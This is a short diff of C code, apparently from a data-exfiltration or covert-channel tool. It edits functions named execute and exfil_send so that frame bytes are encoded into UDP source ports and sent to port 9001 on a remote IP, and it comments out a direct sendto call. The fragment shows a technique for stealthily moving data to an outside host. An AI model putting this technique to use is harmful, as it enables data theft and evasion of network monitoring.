@@ -177,11 +177,11 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 
 //			enc = encrypt(SEKRET, frame, FRAM_SZ);
 
-			sendto(sock, frame, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
-//			src_port = (frame[0] << 8) + frame[i];
-//			dst_port = 9001;
+//			sendto(sock, frame, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
+			src_port = (frame[0] << 8) + frame[i];
+			dst_port = 9001;
 
-//			_sendUDP(ip, src_port, dst_port, TRUE);
+			_sendUDP(ip, src_port, dst_port);
 			
 			usleep(SLEEP_TIME);
 
@@ -240,7 +240,7 @@ void exfil_send(uint32 ipaddr, char *path)
 
 			//free(enc);
 			
-			_sendUDP(ipaddr, src_port, dst_port, TRUE);
+			_sendUDP(ipaddr, src_port, dst_port);
 			
 			usleep(SLEEP_TIME);
 		}
